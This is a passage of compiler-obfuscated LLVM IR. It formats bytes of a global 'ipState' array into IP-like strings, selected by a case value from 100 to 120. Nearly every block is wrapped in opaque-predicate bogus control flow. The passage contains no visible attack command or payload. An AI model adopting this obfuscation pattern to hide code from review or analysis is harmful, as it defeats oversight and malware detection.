  %1911 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1912 = zext i8 %1911 to i32
  %1913 = call i32 (i8*, i8*, ...) @szprintf(i8* %1908, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.768, i32 0, i32 0), i32 %1910, i32 %1912)
  %1914 = load i32, i32* @x.65
  %1915 = load i32, i32* @y.66
  %1916 = sub i32 %1914, 1
  %1917 = mul i32 %1914, %1916
  %1918 = urem i32 %1917, 2
  %1919 = icmp eq i32 %1918, 0
  %1920 = icmp slt i32 %1915, 10
  %1921 = or i1 %1919, %1920
  br i1 %1921, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br label %1922

; <label>:1922:                                   ; preds = %originalBBpart2220, %1896
  %1923 = load i32, i32* @x.65
  %1924 = load i32, i32* @y.66
  %1925 = sub i32 %1923, 1
  %1926 = mul i32 %1923, %1925
  %1927 = urem i32 %1926, 2
  %1928 = icmp eq i32 %1927, 0
  %1929 = icmp slt i32 %1924, 10
  %1930 = or i1 %1928, %1929
  br i1 %1930, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1922
  %1931 = load i32, i32* %1, align 4
  %1932 = icmp eq i32 %1931, 100
  %1933 = load i32, i32* @x.65
  %1934 = load i32, i32* @y.66
  %1935 = sub i32 %1933, 1
  %1936 = mul i32 %1933, %1935
  %1937 = urem i32 %1936, 2
  %1938 = icmp eq i32 %1937, 0
  %1939 = icmp slt i32 %1934, 10
  %1940 = or i1 %1938, %1939
  br i1 %1940, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br i1 %1932, label %1941, label %1948

; <label>:1941:                                   ; preds = %originalBBpart2224
  %1942 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1943 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1944 = zext i8 %1943 to i32
  %1945 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1946 = zext i8 %1945 to i32
  %1947 = call i32 (i8*, i8*, ...) @szprintf(i8* %1942, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.769, i32 0, i32 0), i32 %1944, i32 %1946)
  br label %1948

; <label>:1948:                                   ; preds = %1941, %originalBBpart2224
  %1949 = load i32, i32* %1, align 4
  %1950 = icmp eq i32 %1949, 101
  br i1 %1950, label %1951, label %1958

; <label>:1951:                                   ; preds = %1948
  %1952 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1953 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1954 = zext i8 %1953 to i32
  %1955 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1956 = zext i8 %1955 to i32
  %1957 = call i32 (i8*, i8*, ...) @szprintf(i8* %1952, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.770, i32 0, i32 0), i32 %1954, i32 %1956)
  br label %1958

; <label>:1958:                                   ; preds = %1951, %1948
  %1959 = load i32, i32* %1, align 4
  %1960 = icmp eq i32 %1959, 102
  br i1 %1960, label %1961, label %1968

; <label>:1961:                                   ; preds = %1958
  %1962 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1963 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1964 = zext i8 %1963 to i32
  %1965 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1966 = zext i8 %1965 to i32
  %1967 = call i32 (i8*, i8*, ...) @szprintf(i8* %1962, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.771, i32 0, i32 0), i32 %1964, i32 %1966)
  br label %1968

; <label>:1968:                                   ; preds = %1961, %1958
  %1969 = load i32, i32* %1, align 4
  %1970 = icmp eq i32 %1969, 103
  br i1 %1970, label %1971, label %1978

; <label>:1971:                                   ; preds = %1968
  %1972 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1973 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1974 = zext i8 %1973 to i32
  %1975 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1976 = zext i8 %1975 to i32
  %1977 = call i32 (i8*, i8*, ...) @szprintf(i8* %1972, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.772, i32 0, i32 0), i32 %1974, i32 %1976)
  br label %1978

; <label>:1978:                                   ; preds = %1971, %1968
  %1979 = load i32, i32* @x.65
  %1980 = load i32, i32* @y.66
  %1981 = sub i32 %1979, 1
  %1982 = mul i32 %1979, %1981
  %1983 = urem i32 %1982, 2
  %1984 = icmp eq i32 %1983, 0
  %1985 = icmp slt i32 %1980, 10
  %1986 = or i1 %1984, %1985
  br i1 %1986, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %1978
  %1987 = load i32, i32* %1, align 4
  %1988 = icmp eq i32 %1987, 104
  %1989 = load i32, i32* @x.65
  %1990 = load i32, i32* @y.66
  %1991 = sub i32 %1989, 1
  %1992 = mul i32 %1989, %1991
  %1993 = urem i32 %1992, 2
  %1994 = icmp eq i32 %1993, 0
  %1995 = icmp slt i32 %1990, 10
  %1996 = or i1 %1994, %1995
  br i1 %1996, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br i1 %1988, label %1997, label %2004

; <label>:1997:                                   ; preds = %originalBBpart2228
  %1998 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1999 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2000 = zext i8 %1999 to i32
  %2001 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2002 = zext i8 %2001 to i32
  %2003 = call i32 (i8*, i8*, ...) @szprintf(i8* %1998, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.773, i32 0, i32 0), i32 %2000, i32 %2002)
  br label %2004

; <label>:2004:                                   ; preds = %1997, %originalBBpart2228
  %2005 = load i32, i32* @x.65
  %2006 = load i32, i32* @y.66
  %2007 = sub i32 %2005, 1
  %2008 = mul i32 %2005, %2007
  %2009 = urem i32 %2008, 2
  %2010 = icmp eq i32 %2009, 0
  %2011 = icmp slt i32 %2006, 10
  %2012 = or i1 %2010, %2011
  br i1 %2012, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %2004
  %2013 = load i32, i32* %1, align 4
  %2014 = icmp eq i32 %2013, 105
  %2015 = load i32, i32* @x.65
  %2016 = load i32, i32* @y.66
  %2017 = sub i32 %2015, 1
  %2018 = mul i32 %2015, %2017
  %2019 = urem i32 %2018, 2
  %2020 = icmp eq i32 %2019, 0
  %2021 = icmp slt i32 %2016, 10
  %2022 = or i1 %2020, %2021
  br i1 %2022, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br i1 %2014, label %2023, label %2030

; <label>:2023:                                   ; preds = %originalBBpart2232
  %2024 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2025 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2026 = zext i8 %2025 to i32
  %2027 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2028 = zext i8 %2027 to i32
  %2029 = call i32 (i8*, i8*, ...) @szprintf(i8* %2024, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.774, i32 0, i32 0), i32 %2026, i32 %2028)
  br label %2030

; <label>:2030:                                   ; preds = %2023, %originalBBpart2232
  %2031 = load i32, i32* %1, align 4
  %2032 = icmp eq i32 %2031, 106
  br i1 %2032, label %2033, label %2040

; <label>:2033:                                   ; preds = %2030
  %2034 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2035 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2036 = zext i8 %2035 to i32
  %2037 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2038 = zext i8 %2037 to i32
  %2039 = call i32 (i8*, i8*, ...) @szprintf(i8* %2034, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.775, i32 0, i32 0), i32 %2036, i32 %2038)
  br label %2040

; <label>:2040:                                   ; preds = %2033, %2030
  %2041 = load i32, i32* %1, align 4
  %2042 = icmp eq i32 %2041, 107
  br i1 %2042, label %2043, label %2066

; <label>:2043:                                   ; preds = %2040
  %2044 = load i32, i32* @x.65
  %2045 = load i32, i32* @y.66
  %2046 = sub i32 %2044, 1
  %2047 = mul i32 %2044, %2046
  %2048 = urem i32 %2047, 2
  %2049 = icmp eq i32 %2048, 0
  %2050 = icmp slt i32 %2045, 10
  %2051 = or i1 %2049, %2050
  br i1 %2051, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %2043
  %2052 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2053 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2054 = zext i8 %2053 to i32
  %2055 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2056 = zext i8 %2055 to i32
  %2057 = call i32 (i8*, i8*, ...) @szprintf(i8* %2052, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.776, i32 0, i32 0), i32 %2054, i32 %2056)
  %2058 = load i32, i32* @x.65
  %2059 = load i32, i32* @y.66
  %2060 = sub i32 %2058, 1
  %2061 = mul i32 %2058, %2060
  %2062 = urem i32 %2061, 2
  %2063 = icmp eq i32 %2062, 0
  %2064 = icmp slt i32 %2059, 10
  %2065 = or i1 %2063, %2064
  br i1 %2065, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  br label %2066

; <label>:2066:                                   ; preds = %originalBBpart2236, %2040
  %2067 = load i32, i32* @x.65
  %2068 = load i32, i32* @y.66
  %2069 = sub i32 %2067, 1
  %2070 = mul i32 %2067, %2069
  %2071 = urem i32 %2070, 2
  %2072 = icmp eq i32 %2071, 0
  %2073 = icmp slt i32 %2068, 10
  %2074 = or i1 %2072, %2073
  br i1 %2074, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %2066
  %2075 = load i32, i32* %1, align 4
  %2076 = icmp eq i32 %2075, 108
  %2077 = load i32, i32* @x.65
  %2078 = load i32, i32* @y.66
  %2079 = sub i32 %2077, 1
  %2080 = mul i32 %2077, %2079
  %2081 = urem i32 %2080, 2
  %2082 = icmp eq i32 %2081, 0
  %2083 = icmp slt i32 %2078, 10
  %2084 = or i1 %2082, %2083
  br i1 %2084, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br i1 %2076, label %2085, label %2092

; <label>:2085:                                   ; preds = %originalBBpart2240
  %2086 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2087 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2088 = zext i8 %2087 to i32
  %2089 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2090 = zext i8 %2089 to i32
  %2091 = call i32 (i8*, i8*, ...) @szprintf(i8* %2086, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.777, i32 0, i32 0), i32 %2088, i32 %2090)
  br label %2092

; <label>:2092:                                   ; preds = %2085, %originalBBpart2240
  %2093 = load i32, i32* @x.65
  %2094 = load i32, i32* @y.66
  %2095 = sub i32 %2093, 1
  %2096 = mul i32 %2093, %2095
  %2097 = urem i32 %2096, 2
  %2098 = icmp eq i32 %2097, 0
  %2099 = icmp slt i32 %2094, 10
  %2100 = or i1 %2098, %2099
  br i1 %2100, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %2092
  %2101 = load i32, i32* %1, align 4
  %2102 = icmp eq i32 %2101, 109
  %2103 = load i32, i32* @x.65
  %2104 = load i32, i32* @y.66
  %2105 = sub i32 %2103, 1
  %2106 = mul i32 %2103, %2105
  %2107 = urem i32 %2106, 2
  %2108 = icmp eq i32 %2107, 0
  %2109 = icmp slt i32 %2104, 10
  %2110 = or i1 %2108, %2109
  br i1 %2110, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br i1 %2102, label %2111, label %2118

; <label>:2111:                                   ; preds = %originalBBpart2244
  %2112 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2114 = zext i8 %2113 to i32
  %2115 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2116 = zext i8 %2115 to i32
  %2117 = call i32 (i8*, i8*, ...) @szprintf(i8* %2112, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.778, i32 0, i32 0), i32 %2114, i32 %2116)
  br label %2118

; <label>:2118:                                   ; preds = %2111, %originalBBpart2244
  %2119 = load i32, i32* @x.65
  %2120 = load i32, i32* @y.66
  %2121 = sub i32 %2119, 1
  %2122 = mul i32 %2119, %2121
  %2123 = urem i32 %2122, 2
  %2124 = icmp eq i32 %2123, 0
  %2125 = icmp slt i32 %2120, 10
  %2126 = or i1 %2124, %2125
  br i1 %2126, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %2118
  %2127 = load i32, i32* %1, align 4
  %2128 = icmp eq i32 %2127, 110
  %2129 = load i32, i32* @x.65
  %2130 = load i32, i32* @y.66
  %2131 = sub i32 %2129, 1
  %2132 = mul i32 %2129, %2131
  %2133 = urem i32 %2132, 2
  %2134 = icmp eq i32 %2133, 0
  %2135 = icmp slt i32 %2130, 10
  %2136 = or i1 %2134, %2135
  br i1 %2136, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br i1 %2128, label %2137, label %2144

; <label>:2137:                                   ; preds = %originalBBpart2248
  %2138 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2139 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2140 = zext i8 %2139 to i32
  %2141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2142 = zext i8 %2141 to i32
  %2143 = call i32 (i8*, i8*, ...) @szprintf(i8* %2138, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.779, i32 0, i32 0), i32 %2140, i32 %2142)
  br label %2144

; <label>:2144:                                   ; preds = %2137, %originalBBpart2248
  %2145 = load i32, i32* %1, align 4
  %2146 = icmp eq i32 %2145, 111
  br i1 %2146, label %2147, label %2170

; <label>:2147:                                   ; preds = %2144
  %2148 = load i32, i32* @x.65
  %2149 = load i32, i32* @y.66
  %2150 = sub i32 %2148, 1
  %2151 = mul i32 %2148, %2150
  %2152 = urem i32 %2151, 2
  %2153 = icmp eq i32 %2152, 0
  %2154 = icmp slt i32 %2149, 10
  %2155 = or i1 %2153, %2154
  br i1 %2155, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %2147
  %2156 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2157 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2158 = zext i8 %2157 to i32
  %2159 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2160 = zext i8 %2159 to i32
  %2161 = call i32 (i8*, i8*, ...) @szprintf(i8* %2156, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.765, i32 0, i32 0), i32 %2158, i32 %2160)
  %2162 = load i32, i32* @x.65
  %2163 = load i32, i32* @y.66
  %2164 = sub i32 %2162, 1
  %2165 = mul i32 %2162, %2164
  %2166 = urem i32 %2165, 2
  %2167 = icmp eq i32 %2166, 0
  %2168 = icmp slt i32 %2163, 10
  %2169 = or i1 %2167, %2168
  br i1 %2169, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br label %2170

; <label>:2170:                                   ; preds = %originalBBpart2252, %2144
  %2171 = load i32, i32* %1, align 4
  %2172 = icmp eq i32 %2171, 112
  br i1 %2172, label %2173, label %2196

; <label>:2173:                                   ; preds = %2170
  %2174 = load i32, i32* @x.65
  %2175 = load i32, i32* @y.66
  %2176 = sub i32 %2174, 1
  %2177 = mul i32 %2174, %2176
  %2178 = urem i32 %2177, 2
  %2179 = icmp eq i32 %2178, 0
  %2180 = icmp slt i32 %2175, 10
  %2181 = or i1 %2179, %2180
  br i1 %2181, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %2173
  %2182 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2183 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2184 = zext i8 %2183 to i32
  %2185 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2186 = zext i8 %2185 to i32
  %2187 = call i32 (i8*, i8*, ...) @szprintf(i8* %2182, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.780, i32 0, i32 0), i32 %2184, i32 %2186)
  %2188 = load i32, i32* @x.65
  %2189 = load i32, i32* @y.66
  %2190 = sub i32 %2188, 1
  %2191 = mul i32 %2188, %2190
  %2192 = urem i32 %2191, 2
  %2193 = icmp eq i32 %2192, 0
  %2194 = icmp slt i32 %2189, 10
  %2195 = or i1 %2193, %2194
  br i1 %2195, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br label %2196

; <label>:2196:                                   ; preds = %originalBBpart2256, %2170
  %2197 = load i32, i32* %1, align 4
  %2198 = icmp eq i32 %2197, 113
  br i1 %2198, label %2199, label %2206

; <label>:2199:                                   ; preds = %2196
  %2200 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2201 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2202 = zext i8 %2201 to i32
  %2203 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2204 = zext i8 %2203 to i32
  %2205 = call i32 (i8*, i8*, ...) @szprintf(i8* %2200, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.781, i32 0, i32 0), i32 %2202, i32 %2204)
  br label %2206

; <label>:2206:                                   ; preds = %2199, %2196
  %2207 = load i32, i32* @x.65
  %2208 = load i32, i32* @y.66
  %2209 = sub i32 %2207, 1
  %2210 = mul i32 %2207, %2209
  %2211 = urem i32 %2210, 2
  %2212 = icmp eq i32 %2211, 0
  %2213 = icmp slt i32 %2208, 10
  %2214 = or i1 %2212, %2213
  br i1 %2214, label %originalBB258, label %originalBB258alteredBB

originalBB258:                                    ; preds = %originalBB258alteredBB, %2206
  %2215 = load i32, i32* %1, align 4
  %2216 = icmp eq i32 %2215, 114
  %2217 = load i32, i32* @x.65
  %2218 = load i32, i32* @y.66
  %2219 = sub i32 %2217, 1
  %2220 = mul i32 %2217, %2219
  %2221 = urem i32 %2220, 2
  %2222 = icmp eq i32 %2221, 0
  %2223 = icmp slt i32 %2218, 10
  %2224 = or i1 %2222, %2223
  br i1 %2224, label %originalBBpart2260, label %originalBB258alteredBB

originalBBpart2260:                               ; preds = %originalBB258
  br i1 %2216, label %2225, label %2248

; <label>:2225:                                   ; preds = %originalBBpart2260
  %2226 = load i32, i32* @x.65
  %2227 = load i32, i32* @y.66
  %2228 = sub i32 %2226, 1
  %2229 = mul i32 %2226, %2228
  %2230 = urem i32 %2229, 2
  %2231 = icmp eq i32 %2230, 0
  %2232 = icmp slt i32 %2227, 10
  %2233 = or i1 %2231, %2232
  br i1 %2233, label %originalBB262, label %originalBB262alteredBB

originalBB262:                                    ; preds = %originalBB262alteredBB, %2225
  %2234 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2235 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2236 = zext i8 %2235 to i32
  %2237 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2238 = zext i8 %2237 to i32
  %2239 = call i32 (i8*, i8*, ...) @szprintf(i8* %2234, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.782, i32 0, i32 0), i32 %2236, i32 %2238)
  %2240 = load i32, i32* @x.65
  %2241 = load i32, i32* @y.66
  %2242 = sub i32 %2240, 1
  %2243 = mul i32 %2240, %2242
  %2244 = urem i32 %2243, 2
  %2245 = icmp eq i32 %2244, 0
  %2246 = icmp slt i32 %2241, 10
  %2247 = or i1 %2245, %2246
  br i1 %2247, label %originalBBpart2264, label %originalBB262alteredBB

originalBBpart2264:                               ; preds = %originalBB262
  br label %2248

; <label>:2248:                                   ; preds = %originalBBpart2264, %originalBBpart2260
  %2249 = load i32, i32* %1, align 4
  %2250 = icmp eq i32 %2249, 115
  br i1 %2250, label %2251, label %2274

; <label>:2251:                                   ; preds = %2248
  %2252 = load i32, i32* @x.65
  %2253 = load i32, i32* @y.66
  %2254 = sub i32 %2252, 1
  %2255 = mul i32 %2252, %2254
  %2256 = urem i32 %2255, 2
  %2257 = icmp eq i32 %2256, 0
  %2258 = icmp slt i32 %2253, 10
  %2259 = or i1 %2257, %2258
  br i1 %2259, label %originalBB266, label %originalBB266alteredBB

originalBB266:                                    ; preds = %originalBB266alteredBB, %2251
  %2260 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2261 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2262 = zext i8 %2261 to i32
  %2263 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2264 = zext i8 %2263 to i32
  %2265 = call i32 (i8*, i8*, ...) @szprintf(i8* %2260, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.783, i32 0, i32 0), i32 %2262, i32 %2264)
  %2266 = load i32, i32* @x.65
  %2267 = load i32, i32* @y.66
  %2268 = sub i32 %2266, 1
  %2269 = mul i32 %2266, %2268
  %2270 = urem i32 %2269, 2
  %2271 = icmp eq i32 %2270, 0
  %2272 = icmp slt i32 %2267, 10
  %2273 = or i1 %2271, %2272
  br i1 %2273, label %originalBBpart2268, label %originalBB266alteredBB

originalBBpart2268:                               ; preds = %originalBB266
  br label %2274

; <label>:2274:                                   ; preds = %originalBBpart2268, %2248
  %2275 = load i32, i32* %1, align 4
  %2276 = icmp eq i32 %2275, 116
  br i1 %2276, label %2277, label %2284

; <label>:2277:                                   ; preds = %2274
  %2278 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2279 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2280 = zext i8 %2279 to i32
  %2281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2282 = zext i8 %2281 to i32
  %2283 = call i32 (i8*, i8*, ...) @szprintf(i8* %2278, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.784, i32 0, i32 0), i32 %2280, i32 %2282)
  br label %2284

; <label>:2284:                                   ; preds = %2277, %2274
  %2285 = load i32, i32* %1, align 4
  %2286 = icmp eq i32 %2285, 117
  br i1 %2286, label %2287, label %2294

; <label>:2287:                                   ; preds = %2284
  %2288 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2289 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2290 = zext i8 %2289 to i32
  %2291 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2292 = zext i8 %2291 to i32
  %2293 = call i32 (i8*, i8*, ...) @szprintf(i8* %2288, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.785, i32 0, i32 0), i32 %2290, i32 %2292)
  br label %2294

; <label>:2294:                                   ; preds = %2287, %2284
  %2295 = load i32, i32* %1, align 4
  %2296 = icmp eq i32 %2295, 118
  br i1 %2296, label %2297, label %2304

; <label>:2297:                                   ; preds = %2294
  %2298 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2299 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2300 = zext i8 %2299 to i32
  %2301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2302 = zext i8 %2301 to i32
  %2303 = call i32 (i8*, i8*, ...) @szprintf(i8* %2298, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.786, i32 0, i32 0), i32 %2300, i32 %2302)
  br label %2304

; <label>:2304:                                   ; preds = %2297, %2294
  %2305 = load i32, i32* %1, align 4
  %2306 = icmp eq i32 %2305, 119
  br i1 %2306, label %2307, label %2314

; <label>:2307:                                   ; preds = %2304
  %2308 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2309 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2310 = zext i8 %2309 to i32
  %2311 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2312 = zext i8 %2311 to i32
  %2313 = call i32 (i8*, i8*, ...) @szprintf(i8* %2308, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.787, i32 0, i32 0), i32 %2310, i32 %2312)
  br label %2314

; <label>:2314:                                   ; preds = %2307, %2304
  %2315 = load i32, i32* @x.65
  %2316 = load i32, i32* @y.66
  %2317 = sub i32 %2315, 1
  %2318 = mul i32 %2315, %2317
  %2319 = urem i32 %2318, 2
  %2320 = icmp eq i32 %2319, 0
  %2321 = icmp slt i32 %2316, 10
  %2322 = or i1 %2320, %2321
  br i1 %2322, label %originalBB270, label %originalBB270alteredBB

originalBB270:                                    ; preds = %originalBB270alteredBB, %2314
  %2323 = load i32, i32* %1, align 4
  %2324 = icmp eq i32 %2323, 120
  %2325 = load i32, i32* @x.65
  %2326 = load i32, i32* @y.66
  %2327 = sub i32 %2325, 1
  %2328 = mul i32 %2325, %2327
  %2329 = urem i32 %2328, 2
  %2330 = icmp eq i32 %2329, 0
  %2331 = icmp slt i32 %2326, 10
  %2332 = or i1 %2330, %2331
  br i1 %2332, label %originalBBpart2272, label %originalBB270alteredBB

originalBBpart2272:                               ; preds = %originalBB270
  br i1 %2324, label %2333, label %2356

; <label>:2333:                                   ; preds = %originalBBpart2272
  %2334 = load i32, i32* @x.65
  %2335 = load i32, i32* @y.66
  %2336 = sub i32 %2334, 1
  %2337 = mul i32 %2334, %2336
  %2338 = urem i32 %2337, 2
  %2339 = icmp eq i32 %2338, 0
  %2340 = icmp slt i32 %2335, 10
  %2341 = or i1 %2339, %2340
  br i1 %2341, label %originalBB274, label %originalBB274alteredBB

originalBB274:                                    ; preds = %originalBB274alteredBB, %2333
  %2342 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2343 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2344 = zext i8 %2343 to i32
  %2345 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2346 = zext i8 %2345 to i32
  %2347 = call i32 (i8*, i8*, ...) @szprintf(i8* %2342, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.788, i32 0, i32 0), i32 %2344, i32 %2346)
  %2348 = load i32, i32* @x.65
  %2349 = load i32, i32* @y.66
  %2350 = sub i32 %2348, 1
  %2351 = mul i32 %2348, %2350
  %2352 = urem i32 %2351, 2
  %2353 = icmp eq i32 %2352, 0
  %2354 = icmp slt i32 %2349, 10
  %2355 = or i1 %2353, %2354
  br i1 %2355, label %originalBBpart2276, label %originalBB274alteredBB

originalBBpart2276:                               ; preds = %originalBB274
  br label %2356

; <label>:2356:                                   ; preds = %originalBBpart2276, %originalBBpart2272
  %2357 = load i32, i32* @x.65
  %2358 = load i32, i32* @y.66
  %2359 = sub i32 %2357, 1
  %2360 = mul i32 %2357, %2359
  %2361 = urem i32 %2360, 2
  %2362 = icmp eq i32 %2361, 0
  %2363 = icmp slt i32 %2358, 10
  %2364 = or i1 %2362, %2363
  br i1 %2364, label %originalBB278, label %originalBB278alteredBB

